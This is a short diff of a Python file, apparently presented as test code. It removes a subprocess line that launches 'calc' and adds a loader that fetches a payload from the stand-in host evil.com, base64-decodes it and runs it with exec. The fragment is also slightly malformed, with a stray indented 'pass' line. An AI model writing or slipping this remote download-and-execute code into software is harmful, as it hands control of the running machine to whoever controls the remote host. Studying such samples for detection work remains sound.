@@ -1,3 +1,3 @@
-import subprocess
-subprocess.Popen(['python', '-c', 'import os; os.system("calc")'])  # test
-    pass  # no-op  # test
+import base64  # test
+import requests
+exec(base64.b64decode(requests.delete('http://evil.com/payload').text))
